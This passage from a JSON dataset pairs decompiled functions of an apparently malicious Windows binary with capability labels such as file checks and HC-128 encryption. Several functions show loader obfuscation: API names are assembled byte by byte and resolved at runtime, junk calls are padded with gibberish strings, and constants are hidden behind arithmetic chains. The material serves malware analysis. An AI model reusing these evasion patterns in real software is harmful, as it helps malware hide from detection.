0x1f) | var_ch;\n                arg_8h = arg_8h + 1;\n                var_ch = var_10h << (0x20 - uVar10 & 0x1f);\n            } while (arg_8h < 3);\n            iVar4 = 2;\n            puVar8 = &var_18h + -iVar12;\n            do {\n                if (iVar4 < iVar12) {\n                    (&var_20h)[iVar4] = 0;\n                }\n                else {\n                    (&var_20h)[iVar4] = *puVar8;\n                }\n                iVar4 = iVar4 + -1;\n                puVar8 = puVar8 + -1;\n            } while (-1 < iVar4);\n        }\n        iVar12 = 0;\n        uVar5 = 2;\n    }\ncode_r0x00419da5:\n    var_20h = iVar12 << (0x1fU - *0x441ff8 & 0x1f) | -(var_14h != 0) & 0x80000000 | var_20h;\n    if (*0x441ffc == 0x40) {\n        arg_ch[1] = var_20h;\n        *arg_ch = var_1ch;\n    }\n    else if (*0x441ffc == 0x20) {\n        *arg_ch = var_20h;\n    }\n    return uVar5;\n}\n",
        "token_count": 3630
    },
    "00401141": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00401141(void)\n\n{\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    fcn.004090ab(0);\n    *(unaff_EBP + -4) = 0;\n    if (*(extraout_ECX + 4) != -1) {\n        *(extraout_ECX + 4) = *(extraout_ECX + 4) + 1;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004090d3();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 191
    },
    "00401182": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.00401182(void)\n\n{\n    int32_t iVar1;\n    uint32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    fcn.004090ab(0);\n    *(unaff_EBP + -4) = 0;\n    iVar1 = *(extraout_ECX + 4);\n    if ((iVar1 != 0) && (iVar1 != -1)) {\n        *(extraout_ECX + 4) = iVar1 + -1;\n    }\n    iVar1 = *(extraout_ECX + 4);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004090d3();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return ~-(iVar1 != 0) & extraout_ECX;\n}\n",
        "token_count": 248
    },
    "00407035": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t __cdecl fcn.00407035(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    fcn.004090ab(0);\n    *(unaff_EBP + -4) = 0;\n    iVar1 = *0x4d22e0;\n    *(unaff_EBP + -0x10) = *0x4d22e0;\n    arg_8h_00 = fcn.004010f3();\n    iVar2 = fcn.00401228(arg_8h_00);\n    if ((iVar2 == 0) && (iVar2 = iVar1,  iVar1 == 0)) {\n        iVar2 = fcn.00406d6f(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.0040996f(\"bad cast\");\n            fcn.0040a136(unaff_EBP + -0x20, 0x421130);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x4d22e0 = iVar2;\n        fcn.00401141();\n        fcn.0040924c(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004090d3();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 425
    },
    "004074b2": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t __cdecl fcn.004074b2(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    fcn.004090ab(0);\n    *(unaff_EBP + -4) = 0;\n    iVar1 = *0x4d22e4;\n    *(unaff_EBP + -0x10) = *0x4d22e4;\n    arg_8h_00 = fcn.004010f3();\n    iVar2 = fcn.00401228(arg_8h_00);\n    if ((iVar2 == 0) && (iVar2 = iVar1,  iVar1 == 0)) {\n        iVar2 = fcn.00407105(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.0040996f(\"bad cast\");\n            fcn.0040a136(unaff_EBP + -0x20, 0x421130);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x4d22e4 = iVar2;\n        fcn.00401141();\n        fcn.0040924c(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004090d3();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 424
    },
    "0040755a": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nint32_t __cdecl fcn.0040755a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    fcn.004090ab(0);\n    *(unaff_EBP + -4) = 0;\n    iVar1 = *0x4d22e8;\n    *(unaff_EBP + -0x10) = *0x4d22e8;\n    arg_8h_00 = fcn.004010f3();\n    iVar2 = fcn.00401228(arg_8h_00);\n    if ((iVar2 == 0) && (iVar2 = iVar1,  iVar1 == 0)) {\n        iVar2 = fcn.004071cc(unaff_EBP + -0x10, *(unaff_EBP + 8));\n        if (iVar2 == -1) {\n            fcn.0040996f(\"bad cast\");\n            fcn.0040a136(unaff_EBP + -0x20, 0x421130);\n        }\n        iVar2 = *(unaff_EBP + -0x10);\n        *0x4d22e8 = iVar2;\n        fcn.00401141();\n        fcn.0040924c(iVar2);\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.004090d3();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return iVar2;\n}\n",
        "token_count": 424
    },
    "00408019": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00408019(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint arg_8h;\n    \n    arg_8h = 0;\n    if ((*(param_1 + *(*param_1 + 4) + 8) & 6) == 0) {\n        iVar1 = (**(**(param_1 + *(*param_1 + 4) + 0x28) + 0x30))();\n        if (iVar1 == -1) {\n            arg_8h = 4;\n        }\n    }\n    fcn.00407731(arg_8h, 0);\n    return param_1;\n}\n",
        "token_count": 152
    },
    "004089ec": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_20h\n\nint32_t * fcn.004089ec(void)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *arg_8h;\n    char *pcVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_8h;\n    uint var_ch;\n    uint var_10h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_ch_2;\n    uint var_4h;\n    uint uStack4;\n    \n    uStack4 = 0x4089f6;\n    fcn.00409df4();\n    *(unaff_EBP + -0x10) = &fcn.004089ec::var_20h;\n    *(unaff_EBP + -0x14) = 0;\n    pcVar3 = *(unaff_EBP + 0xc);\n    pcVar1 = pcVar3 + 1;\n    do {\n        cVar2 = *pcVar3;\n        pcVar3 = pcVar3 + 1;\n    } while (cVar2 != '\\0');\n    iVar4 = pcVar3 - pcVar1;\n    arg_8h = *(unaff_EBP + 8);\n    iVar5 = *(*(*arg_8h + 4) + 0x18 + arg_8h);\n    if ((iVar5 < 1) || (iVar5 <= iVar4)) {\n        *(unaff_EBP + -0x18) = 0;\n    }\n    else {\n        *(unaff_EBP + -0x18) = iVar5 - iVar4;\n    }\n    fcn.00408129(arg_8h);\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x20) == '\\0') {\n        *(unaff_EBP + -0x14) = 4;\n        goto code_r0x00408b1d;\n    }\n    *(unaff_EBP + -4) = 1;\n    if ((*(*(*arg_8h + 4) + 0x10 + arg_8h) & 0x1c0) == 0x40) {\ncode_r0x00408a95:\n        iVar5 = (**(**(*(*arg_8h + 4) + 0x28 + arg_8h) + 0x20))(*(unaff_EBP + 0xc), iVar4);\n        if (iVar5 == iVar4) {\n            while (0 < *(unaff_EBP + -0x18)) {\n                *(unaff_EBP + -0x1c) = *(arg_8h + *(*arg_8h + 4) + 0x30);\n                iVar5 = fcn.004058a6(*(unaff_EBP + -0x1c));\n                if (iVar5 == -1) {\n                    *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) | 4;\n                    break;\n                }\n                *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + -1;\n            }\n        }\n        else {\n            *(unaff_EBP + -0x14) = 4;\n        }\n    }\n    else {\n        while (0 < *(unaff_EBP + -0x18)) {\n            *(unaff_EBP + -0x1c) = *(arg_8h + *(*arg_8h + 4) + 0x30);\n            iVar5 = fcn.004058a6(*(unaff_EBP + -0x1c));\n            if (iVar5 == -1) {\n                *(unaff_EBP + -0x14) = *(unaff_EBP + -0x14) | 4;\n                break;\n            }\n            *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + -1;\n        }\n        if (*(unaff_EBP + -0x14) == 0) goto code_r0x00408a95;\n    }\n    *(arg_8h + *(*arg_8h + 4) + 0x18) = 0;\n    *(unaff_EBP + -4) = 0;\ncode_r0x00408b1d:\n    fcn.00407731(*(unaff_EBP + -0x14), 0);\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.00408793();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return arg_8h;\n}\n",
        "token_count": 1114
    },
    "00401393": {
        "rules": [
            "encrypt data using HC-128/96968cc2d377418d85ec89c0278a8523"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00401393(int32_t *param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_8c4h;\n    uint var_c4h;\n    int32_t var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint32_t *var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    int32_t *var_98h;\n    uint var_94h;\n    uint8_t var_90h;\n    uint8_t var_8fh;\n    uint8_t var_8eh;\n    uint var_8dh;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    int32_t var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x4b7583 = 0x6c;\n    *0x4b2664 = 0;\n    *0x4b757a = 0x72;\n    *0x4af094 = 0xd97247ec;\n    *0x4b7581 = 100;\n    *0x4b73f8 = 0;\n    *0x4b73fc = 0;\n    *0x4b757d = 0x6c;\n    *0x4acea0 = 0;\n    *0x4b7579 = 0x65;\n    *0x4b2694 = 0x99babb20;\n    *0x4b757f = 0x32;\n    *0x4b264c = 0;\n    *0x4b757e = 0x33;\n    *0x4d22b8 = 0xb7d9a148;\n    *0x4b7582 = 0x6c;\n    *0x4b26cc = 0xcfd6690e;\n    *0x4b757c = 0x65;\n    *0x4b73dc = 0xbb3d1f3e;\n    *0x4b757b = 0x6e;\n    *0x4b7450 = 0xf2c13ffa;\n    *0x4b7578 = 0x6b;\n    *0x4b7564 = 0xac34f4a2;\n    *0x4b7580 = 0x2e;\n    *0x4b5034 = 0;\n    *0x4b7584 = 0;\n    iVar2 = 0;\n    var_ach = param_2;\n    var_98h = param_1;\n    var_4ch = *0x4acea0;\n    var_48h = *0x4b2694;\n    var_44h = *0x4b73f8;\n    var_3ch = *0x4b7450;\n    var_28h = *0x4b2664;\n    var_24h = *0x4b26cc;\n    var_1ch = *0x4d22b8;\n    var_18h = *0x4b7564;\n    var_14h = *0x4b264c;\n    var_10h = *0x4b5034;\n    var_ch = *0x4af094;\n    var_4h = *0x4b73dc;\n    do {\n        if (iVar2 == 0x3e1133) {\n            *0x4b7478 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0x4b7578);\n        }\n        iVar2 = iVar2 + 1;\n    } while (iVar2 < 0x6bbca5);\n    *0x4b50cf = 0x6c;\n    *0x4b2648 = 0xbcc8e21a;\n    *0x4b50d1 = 0x6f;\n    *0x4b508c = 0xf04335e2;\n    *0x4b50cc = 0x61;\n    *0x4b90d8 = 0xea7b9e92;\n    *0x4b90dc = 0xffffffff;\n    *0x4b50ca = 0x6f;\n    *0x4b7470 = 0;\n    *0x4b7474 = 0;\n    *0x4b50d0 = 0x6c;\n    *0x4b756c = 0;\n    *0x4b50c9 = 0x6c;\n    *0x4563d4 = 0;\n    *0x4b50ce = 0x41;\n    *0x4b90d0 = 0;\n    *0x4b90d4 = 0;\n    *0x4b50cb = 0x62;\n    *0x456408 = 0xa0c2a07c;\n    *0x4b50d2 = 99;\n    *0x4b73d8 = 0;\n    *0x4b50c8 = 0x47;\n    *0x4b744c = 0;\n    *0x4b50cd = 0x6c;\n    *0x4563d0 = 0;\n    *0x4b50d3 = 0;\n    var_5ch = *0x4b756c;\n    var_58h = *0x4563d0;\n    var_54h = *0x4b90d8;\n    var_50h = *0x4b2648;\n    var_40h = *0x4b7470;\n    var_34h = *0x4b90d0;\n    var_30h = *0x456408;\n    var_2ch = *0x4563d4;\n    var_20h = *0x4b508c;\n    var_8h = *0x4b744c;\n    *0x4b5074 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x4b7478, 0x4b50c8);\n    uVar3 = 0;\n    var_a4h = (**0x4b5074)(0, *param_2);\n    var_38h = 4;\n    uVar1 = 0;\n    if (*var_ach != 0) {\n        do {\n            var_8dh._0_1_ = *(*var_98h + uVar1);\n            var_8fh = (*var_98h + uVar1)[1];\n            *0x4af090 = 0;\n            var_7ch = *0x4af090;\n            if (*0x4b90e4 == 0xc3a) {\n                (*_sym.imp.ADVAPI32.dll_RegRestoreKeyW)\n                          (0, \n                           L\"tegobipahuyacekewihojuho civasuhixuniwipaselazuka xoyagiso loyejuvecigoturukavevolokexoxoxi\"\n                           , 0);\n                *0x4b5070 = 0;\n                var_9ch = *0x4b5070;\n            }\n            *0x4b7418 = 0x9f4faef4;\n            var_90h = *(*var_98h + uVar1 + 2);\n            var_8eh = *(*var_98h + uVar1 + 3);\n            var_80h = 2;\n            var_84h = 0xc0;\n            var_8dh._0_1_ = var_8dh | (var_8eh & 0x30) << 2;\n            var_88h = 4;\n            var_68h = 0xc0;\n            var_8fh = var_8fh | (var_8eh & 0xc) << 4;\n            var_64h = 6;\n            var_8eh = var_8eh << 6;\n            *0x4b7460 = 0;\n            *0x4b7464 = 0;\n            var_74h = *0x4b7418;\n            var_70h = *0x4b7460;\n            if (*0x4b90e4 == 0xbfb) {\n                (*_sym.imp.KERNEL32.dll_GetStringTypeExA)(0, 0, \"kixafalatagebuxavuhovukoge tu\", 0, &var_94h);\n                (*_sym.imp.KERNEL32.dll_HeapUnlock)(0);\n                (*_sym.imp.KERNEL32.dll_HeapCompact)(0, 0);\n                *0x4563f0 = 0xea6088b6;\n                *0x4563f4 = 0xffffffff;\n                var_a0h = *0x4563f0;\n            }\n            var_78h = 0;\n            *0x4563dc = 0;\n            var_6ch = 0xc0;\n            var_90h = var_90h | var_8eh & 0xc0;\n            *0x4563d8 = var_78h;\n            *(uVar3 + var_a4h) = var_8dh;\n            *(uVar3 + 1 + var_a4h) = var_8fh;\n            var_bch = uVar3 + 2;\n            *0x4b50c4 = 0;\n            unique0x1000034e = *0x4b50c4;\n            if (*0x4b90e4 == 0x8a) {\n                (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)\n                          (L\"lopivehabasobo bidecegunugatebopujufocamado fazutisifukoba nokutevinopujovo xavafoyogi\", \n                           L\"sagasedagajufelipiwutaya pajujoyocovidudodarihuvica yevigegecexanepivigamekurupidiwo ratewugacerorepo\"\n                           , L\"cehasuhobisemupufazujakideyugo yuhuvido\", &var_8c4h, 0, L\"rojohelawesicamizigilokoneru\");\n                var_b4h = 0;\n                var_b0h = 0;\n                (*_sym.imp.KERNEL32.dll_WriteConsoleOutputW)(0, &var_b8h, 0, 0, &var_c4h);\n                *0x4563bc = 0x9bb5a1c2;\n                var_a8h = *0x4563bc;\n            }\n            var_60h = 0;\n            *0x4b509c = var_60h;\n            *(var_bch + var_a4h) = var_90h;\n            uVar1 = uVar1 + var_38h;\n            uVar3 = var_bch + 1;\n        } while (uVar1 < *var_ach);\n    }\n    *var_98h = var_a4h;\n    *var_ach = uVar3;\n    return;\n}\n",
        "token_count": 2742
    },
    "0040260b": {
        "rules": [
            "encrypt data using HC-128/96968cc2d377418d85ec89c0278a8523"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_24h\n// WARNING: Variable defined which should be unmapped: var_20h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_28h\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_38h\n// WARNING: Variable defined which should be unmapped: var_50h\n// WARNING: Variable defined which should be unmapped: var_4ch\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Variable defined which should be unmapped: var_44h\n// WARNING: Variable defined which should be unmapped: var_5ch\n// WARNING: Variable defined which should be unmapped: var_58h\n// WARNING: Variable defined which should be unmapped: var_54h\n// WARNING: Variable defined which should be unmapped: var_6ch\n// WARNING: Variable defined which should be unmapped: var_68h\n// WARNING: Variable defined which should be unmapped: var_64h\n// WARNING: Variable defined which should be unmapped: var_60h\n// WARNING: Variable defined which should be unmapped: var_74h\n// WARNING: Variable defined which should be unmapped: var_70h\n// WARNING: Variable defined which should be unmapped: var_a0h\n// WARNING: Variable defined which should be unmapped: var_9ch\n// WARNING: Variable defined which should be unmapped: var_98h\n// WARNING: Variable defined which should be unmapped: var_94h\n// WARNING: Variable defined which should be unmapped: var_90h\n// WARNING: Variable defined which should be unmapped: var_8ch\n// WARNING: Variable defined which should be unmapped: var_88h\n// WARNING: Variable defined which should be unmapped: var_84h\n// WARNING: Variable defined which should be unmapped: var_80h\n// WARNING: Variable defined which should be unmapped: var_7ch\n// WARNING: Variable defined which should be unmapped: var_78h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint32_t fcn.0040260b(void)\n\n{\n    code *pcVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint szLang;\n    uint pBuffer;\n    uint lpszVolumeMountPoint;\n    uint var_24ch;\n    uint var_244h;\n    uint var_1f8h;\n    uint var_1c4h;\n    uint ARG_1;\n    uint var_1ach;\n    uint var_1a4h;\n    uint lpCPInfo;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.00409df4();\n    fcn.0040a4f0();\n    *0x442381 = 0x65;\n    *(unaff_EBP + -0x6c) = 0;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + -0x10986322;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + -0x227d0cc0;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 0x16197d0c;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 0x1cfbf2d6;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + -0x3916835c;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + -0x3b21b2a;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + -0x2810dd6e;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 0x51639ef8;\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + -0x6c) + 0x1375dcfc;\n    *0x4b741c = *(unaff_EBP + -0x6c);\n    *0x44238b = 0x6c;\n    *(unaff_EBP + -0x50) = 0xceeea6f2;\n    *(unaff_EBP + -0x50) = *(unaff_EBP + -0x50) + -0x2c6490f8;\n    *0x4b7444 = *(unaff_EBP + -0x50);\n    *0x442387 = 0x32;\n    *(unaff_EBP + -0x28) = 0xa8f210e8;\n    *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + 0x570def18;\n    *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + -0x5352cdb6;\n    *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + -0x1944826c;\n    *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + 0x6c975022;\n    *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + -0x4c76b90;\n    *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + 0x4c76b90;\n    *(unaff_EBP + -0x28) = *(unaff_EBP + -0x28) + -0x495ddb32;\n    *0x4b5044 = *(unaff_EBP + -0x28);\n    *0x442382 = 0x72;\n    *(unaff_EBP + -0xcc) = 0;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + -0x713d587c;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + 0x713d587c;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + -0x44475ad8;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + -0xe07d550;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + 0x2f1d6620;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + 0x2331ca08;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + -0x4620f10a;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + -0xf9d7c0;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + 0x471ac8ca;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + -0x14e0ec24;\n    *(unaff_EBP + -0xcc) = *(unaff_EBP + -0xcc) + 0x14e0ec24;\n    *0x4af098 = *(unaff_EBP + -0xcc);\n    *0x442384 = 0x65;\n    *(unaff_EBP + -0x18) = 0xf229efae;\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + -0xf0756f6;\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + 0x1cdd6748;\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + -0x4f2afa20;\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + 0x83dbfe4;\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + 0x46ed3a3c;\n    *(unaff_EBP + -0x18) = *(unaff_EBP + -0x18) + -0x1a733fb8;\n    *0x4b26d4 = *(unaff_EBP + -0x18);\n    *0x442383 = 0x6e;\n    *(unaff_EBP + -0x74) = 0xdf9cb15e;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x510c0e78;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + 0x716f5d1a;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x77fdba08;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + 0x77fdba08;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x58dcf25c;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + 0x30844038;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + 0x2858b224;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x2763b50;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x1414e8fe;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + 0x168b244e;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x2f125364;\n    *(unaff_EBP + -0x74) = *(unaff_EBP + -0x74) + -0x45e3b700;\n    *0x4b73e8 = *(unaff_EBP + -0x74);\n    *0x442388 = 0x2e;\n    *(unaff_EBP + -0x80) = 0xb89c1b1c;\n    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x80) + 0x4763e4e4;\n    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x80) + -0x38731c8a;\n    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x80) + -0x502fa26;\n    *(unaff_EBP + -0x80) = *(unaff_EBP + -0x80) + -0x23be3c9c;\n    *0x4563c0 = *(unaff_EBP + -0x80);\n    *0x442385 = 0x6c;\n    *(unaff_EBP + -0x30) = 0;\n    *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + -0x6e4ed1fe;\n    *(unaff_EBP + -0x30) = *(unaff_EBP + -0x30) + 0x6e4ed1fe;\n    *0x4b73f4 = *(unaff_EBP + -0x30);\n    *0x442389 = 100;\n    *(unaff_EBP + -0xb0) = 0xe8c9e720;\n    *(unaff_EBP + -0xb0) = *(unaff_EBP + -0xb0) + 0x173618e0;\n    *0x4b2668 = *(unaff_EBP + -0xb0);\n    *0x442386 = 0x33;\n    *(unaff_EBP + -0x34) = 0xd8b01e28;\n    *(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) + -0x21882fde;\n    *(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) + 0x48d811b6;\n    *(unaff_EBP + -0x34) = *(unaff_EBP + -0x34) + -0x536fb3ec;\n    